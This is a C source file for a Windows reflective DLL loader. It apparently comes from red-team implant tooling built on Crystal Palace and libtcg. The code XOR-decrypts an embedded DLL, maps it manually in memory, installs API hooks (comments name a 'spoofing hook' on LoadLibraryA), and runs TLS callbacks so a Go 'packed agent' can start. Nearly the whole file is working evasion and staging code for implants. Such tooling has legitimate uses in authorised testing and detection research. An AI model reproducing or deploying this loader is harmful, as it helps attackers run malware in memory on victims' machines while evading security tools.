// clang-format off
#include <windows.h>

#include "loader.h"
#include "memory.h"
#include "tcg.h"

// clang-format on
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD,
                                                    DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD,
                                                    PDWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

char _PICO_[0] __attribute__((section("pico")));
char _MASK_[0] __attribute__((section("mask")));
char _DLL_[0] __attribute__((section("dll")));
char _DLLARGS_[0] __attribute__((section("dll_args")));

int __tag_setup_hooks();
int __tag_setup_memory();

typedef void (*SETUP_HOOKS)(IMPORTFUNCS *funcs);
typedef void (*SETUP_MEMORY)(MEMORY_LAYOUT *layout);

/* Validate the minimal PE structure before libtcg's ParseDLL walks it. */
static BOOL is_valid_pe(char *base, DWORD size) {
  IMAGE_DOS_HEADER *dos;
  IMAGE_NT_HEADERS *nt;
  DWORD e_lfanew;

  if (base == NULL || size < sizeof(IMAGE_DOS_HEADER)) {
    return FALSE;
  }

  dos = (IMAGE_DOS_HEADER *)base;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return FALSE;
  }

  e_lfanew = (DWORD)dos->e_lfanew;
  if (e_lfanew == 0 || e_lfanew > size ||
      e_lfanew + sizeof(IMAGE_NT_HEADERS) > size) {
    return FALSE;
  }

  nt = (IMAGE_NT_HEADERS *)(base + e_lfanew);
  return nt->Signature == IMAGE_NT_SIGNATURE;
}

BOOL fix_section_permissions(DLLDATA *dll, char *src, char *dst,
                             DLL_MEMORY *dll_memory) {
  DWORD section_count;
  IMAGE_SECTION_HEADER *section_hdr;
  void *section_dst;
  DWORD section_size;
  DWORD new_protect;
  DWORD old_protect;
  int i;

  if (dll == NULL || dll->NtHeaders == NULL || dll->OptionalHeader == NULL ||
      dst == NULL || dll_memory == NULL) {
    return FALSE;
  }

  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
  if (section_count > MAX_SECTIONS) {
    return FALSE;
  }

  section_hdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
      dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

  for (i = 0; i < (int)section_count; i++) {
    section_dst = dst + section_hdr->VirtualAddress;
    section_size = section_hdr->SizeOfRawData;
    if (section_hdr->Misc.VirtualSize > section_size) {
      section_size = section_hdr->Misc.VirtualSize;
    }

    new_protect = 0;
    if (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
      new_protect = PAGE_WRITECOPY;
    }
    if (section_hdr->Characteristics & IMAGE_SCN_MEM_READ) {
      new_protect = PAGE_READONLY;
    }
    if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) &&
        (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
      new_protect = PAGE_READWRITE;
    }
    if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      new_protect = PAGE_EXECUTE;
    }
    if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
        (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
      new_protect = PAGE_EXECUTE_WRITECOPY;
    }
    if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
        (section_hdr->Characteristics & IMAGE_SCN_MEM_READ)) {
      new_protect = PAGE_EXECUTE_READ;
    }
    if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) &&
        (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) &&
        (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
      new_protect = PAGE_EXECUTE_READWRITE;
    }

    if (section_size != 0 && new_protect != 0 && section_dst != NULL) {
      KERNEL32$VirtualProtect(section_dst, section_size, new_protect,
                              &old_protect);
    }

    /* track memory */
    dll_memory->Sections[i].BaseAddress = section_dst;
    dll_memory->Sections[i].Size = section_size;
    dll_memory->Sections[i].CurrentProtect = new_protect;
    dll_memory->Sections[i].PreviousProtect = new_protect;

    /* advance to section */
    section_hdr++;
  }

  dll_memory->Count = section_count;
  return TRUE;
}

/* in_image checks that a pointer derived from the mapped DLL lies within the
 * image. TLS directory fields are absolute addresses and can be corrupt. */
static BOOL in_image(char *base, DWORD size, const void *ptr, SIZE_T len) {
  uintptr_t start = (uintptr_t)base;
  uintptr_t p = (uintptr_t)ptr;

  if (p < start) {
    return FALSE;
  }
  return (p - start) <= size && len <= size - (p - start);
}

/* run_tls_callbacks performs the part of the Windows loader that libtcg's
 * LoadDLL does not implement. A Go c-shared DLL uses TLS for its runtime
 * (the image carries a TLS directory with callbacks), so mapping it without
 * an index and without calling those callbacks leaves the Go runtime without
 * its TLS block and the packed agent dies before main. */
static BOOL run_tls_callbacks(IMPORTFUNCS *funcs, DLLDATA *dll, char *dll_dst,
                              DWORD dll_size) {
  IMAGE_DATA_DIRECTORY *dir;
  IMAGE_TLS_DIRECTORY *tls;
  DWORD index;
  char *block;
  SIZE_T raw_size;
  SIZE_T total;
  PIMAGE_TLS_CALLBACK *callback;
  DWORD i;
  typedef DWORD(WINAPI * TLS_ALLOC_FN)(VOID);
  typedef BOOL(WINAPI * TLS_SET_VALUE_FN)(DWORD, LPVOID);
  TLS_ALLOC_FN tls_alloc;
  TLS_SET_VALUE_FN tls_set_value;
  HMODULE kernel32;

  if (funcs == NULL || dll == NULL || dll->OptionalHeader == NULL) {
    return FALSE;
  }

  dir = &dll->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (dir->VirtualAddress == 0) {
    return TRUE;
  }
  if (dir->VirtualAddress > dll_size ||
      dir->Size < sizeof(IMAGE_TLS_DIRECTORY) ||
      dir->Size > dll_size - dir->VirtualAddress) {
    return FALSE;
  }

  tls = (IMAGE_TLS_DIRECTORY *)(dll_dst + dir->VirtualAddress);
  if (!in_image(dll_dst, dll_size, tls, sizeof(*tls))) {
    return FALSE;
  }
  if (tls->AddressOfIndex != 0 &&
      !in_image(dll_dst, dll_size, (void *)tls->AddressOfIndex,
                sizeof(DWORD))) {
    return FALSE;
  }

  kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
  if (kernel32 == NULL) {
    return FALSE;
  }
  tls_alloc =
      (TLS_ALLOC_FN)(void *)KERNEL32$GetProcAddress(kernel32, "TlsAlloc");
  tls_set_value = (TLS_SET_VALUE_FN)(void *)KERNEL32$GetProcAddress(
      kernel32, "TlsSetValue");
  if (tls_alloc == NULL || tls_set_value == NULL) {
    return FALSE;
  }

  index = tls_alloc();
  if (index == TLS_OUT_OF_INDEXES) {
    return FALSE;
  }
  if (tls->AddressOfIndex != 0) {
    *(DWORD *)tls->AddressOfIndex = index;
  }

  raw_size = (SIZE_T)(tls->EndAddressOfRawData - tls->StartAddressOfRawData);
  if (tls->EndAddressOfRawData < tls->StartAddressOfRawData ||
      (raw_size != 0 &&
       !in_image(dll_dst, dll_size, (void *)tls->StartAddressOfRawData,
                 raw_size))) {
    return FALSE;
  }
  total = raw_size + tls->SizeOfZeroFill;
  if (total < raw_size || total > (256u << 20)) {
    return FALSE;
  }
  block = KERNEL32$VirtualAlloc(NULL, total ? total : 1,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (block == NULL) {
    return FALSE;
  }
  for (SIZE_T n = 0; n < raw_size; n++) {
    block[n] = ((char *)tls->StartAddressOfRawData)[n];
  }
  if (!tls_set_value(index, block)) {
    KERNEL32$VirtualFree(block, 0, MEM_RELEASE);
    return FALSE;
  }

  if (tls->AddressOfCallBacks == 0) {
    return TRUE;
  }
  callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
  if (!in_image(dll_dst, dll_size, callback, sizeof(*callback))) {
    return FALSE;
  }
  for (i = 0; i < 64 && *callback != NULL; i++) {
    if (!in_image(dll_dst, dll_size, callback, sizeof(*callback)) ||
        !in_image(dll_dst, dll_size, (void *)*callback, 1)) {
      return FALSE;
    }
    (*callback)((PVOID)dll_dst, DLL_PROCESS_ATTACH, NULL);
    callback++;
  }
  return TRUE;
}

void go(void *loader_arguments) {
  IMPORTFUNCS funcs;
  char *pico_src;
  char *pico_data = NULL;
  char *pico_code = NULL;
  char *dll_src = NULL;
  char *dll_dst = NULL;
  DLLDATA dll_data;
  MEMORY_LAYOUT memory;
  DWORD old_protect = 0;
  DWORD dll_size;
  DLLMAIN_FUNC entry_point;
  RESOURCE *masked_dll;
  RESOURCE *mask_key;
  RESOURCE *args_resource;
  char *baked_args;
  char *dll_arguments;
  int pico_data_size;
  int pico_code_size;

  /* Resolve the PICO import helpers directly. LoadLibraryA is attached to the
   * spoofing hook in loader.spec; PicoLoad runs before setup_hooks and must not
   * call that hook while it is resolving the inner PICO. */
  {
    HMODULE kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    funcs.LoadLibraryA =
        (__typeof__(funcs.LoadLibraryA))KERNEL32$GetProcAddress(kernel32,
                                                                "LoadLibraryA");
    funcs.GetProcAddress = KERNEL32$GetProcAddress;
  }

  pico_src = GETRESOURCE(_PICO_);
  if (pico_src == NULL) {
    return;
  }

  pico_data_size = PicoDataSize(pico_src);
  pico_code_size = PicoCodeSize(pico_src);
  if (pico_data_size < 0 || pico_code_size < 0) {
    return;
  }

  /* allocate memory for it */
  pico_data = KERNEL32$VirtualAlloc(NULL, (SIZE_T)pico_data_size,
                                    MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                    PAGE_READWRITE);
  pico_code = KERNEL32$VirtualAlloc(NULL, (SIZE_T)pico_code_size,
                                    MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                    PAGE_READWRITE);
  if (pico_data == NULL || pico_code == NULL) {
    goto fail;
  }

  /* load it into memory */
  PicoLoad(&funcs, pico_src, pico_code, pico_data);

  /* make code section RX */
  if (!KERNEL32$VirtualProtect(pico_code, (SIZE_T)pico_code_size,
                               PAGE_EXECUTE_READ, &old_protect)) {
    goto fail;
  }

  /* begin tracking memory allocations */
  {
    /* avoid a memset relocation Crystal Palace can't process */
    volatile unsigned char *zero = (volatile unsigned char *)&memory;
    for (size_t i = 0; i < sizeof(MEMORY_LAYOUT); i++) {
      zero[i] = 0;
    }
  }

  memory.Pico.Data = pico_data;
  memory.Pico.Code = pico_code;

  /* call setup_hooks to overwrite funcs.GetProcAddress */
  {
    SETUP_HOOKS setup_hooks_fn =
        (SETUP_HOOKS)PicoGetExport(pico_src, pico_code, __tag_setup_hooks());
    if (setup_hooks_fn == NULL) {
      goto fail;
    }
    setup_hooks_fn(&funcs);
  }

  /* now load the dll (it's masked) */
  masked_dll = (RESOURCE *)GETRESOURCE(_DLL_);
  mask_key = (RESOURCE *)GETRESOURCE(_MASK_);
  if (masked_dll == NULL || mask_key == NULL || masked_dll->len <= 0 ||
      mask_key->len <= 0) {
    goto fail;
  }

  /* load dll into memory and unmask it */
  dll_src = KERNEL32$VirtualAlloc(NULL, (SIZE_T)masked_dll->len,
                                  MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                  PAGE_READWRITE);
  if (dll_src == NULL) {
    goto fail;
  }

  for (int i = 0; i < masked_dll->len; i++) {
    dll_src[i] =
        (char)(masked_dll->value[i] ^ mask_key->value[i % mask_key->len]);
  }

  /* make sure we have a PE before ParseDLL walks the headers */
  if (!is_valid_pe(dll_src, (DWORD)masked_dll->len)) {
    goto fail;
  }

  ParseDLL(dll_src, &dll_data);

  dll_size = SizeOfDLL(&dll_data);
  if (dll_size == 0) {
    goto fail;
  }

  dll_dst = KERNEL32$VirtualAlloc(NULL, (SIZE_T)dll_size,
                                  MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                  PAGE_READWRITE);
  if (dll_dst == NULL) {
    goto fail;
  }

  LoadDLL(&dll_data, dll_src, dll_dst);

  /* track dll's memory */
  memory.Dll.BaseAddress = (PVOID)(dll_dst);
  memory.Dll.Size = (SIZE_T)dll_size;

  ProcessImports(&funcs, &dll_data, dll_dst);
  if (!fix_section_permissions(&dll_data, dll_src, dll_dst, &memory.Dll)) {
    goto fail;
  }
  if (!run_tls_callbacks(&funcs, &dll_data, dll_dst, dll_size)) {
    goto fail;
  }

  /* call setup_memory to give PICO the memory info */
  {
    SETUP_MEMORY setup_memory_fn =
        (SETUP_MEMORY)PicoGetExport(pico_src, pico_code, __tag_setup_memory());
    if (setup_memory_fn == NULL) {
      goto fail;
    }
    setup_memory_fn(&memory);
  }

  /* now run the DLL */
  entry_point = EntryPoint(&dll_data, dll_dst);
  if (entry_point == NULL ||
      dll_data.OptionalHeader->AddressOfEntryPoint == 0) {
    goto fail;
  }

  /* Pointer to DLL arguments: prefer runtime args from the PICO runner,
   * fall back to the args baked into the dll_args section at link time. */
  args_resource = (RESOURCE *)GETRESOURCE(_DLLARGS_);
  baked_args = (args_resource != NULL && args_resource->len > 0)
                   ? args_resource->value
                   : NULL;
  dll_arguments = loader_arguments ? (char *)loader_arguments : baked_args;

  /* free the unmasked copy */
  KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
  dll_src = NULL;

  entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, dll_arguments);
  return;

fail:
  if (dll_src != NULL) {
    KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
  }
  if (dll_dst != NULL) {
    KERNEL32$VirtualFree(dll_dst, 0, MEM_RELEASE);
  }
  if (pico_code != NULL) {
    KERNEL32$VirtualFree(pico_code, 0, MEM_RELEASE);
  }
  if (pico_data != NULL) {
    KERNEL32$VirtualFree(pico_data, 0, MEM_RELEASE);
  }
}
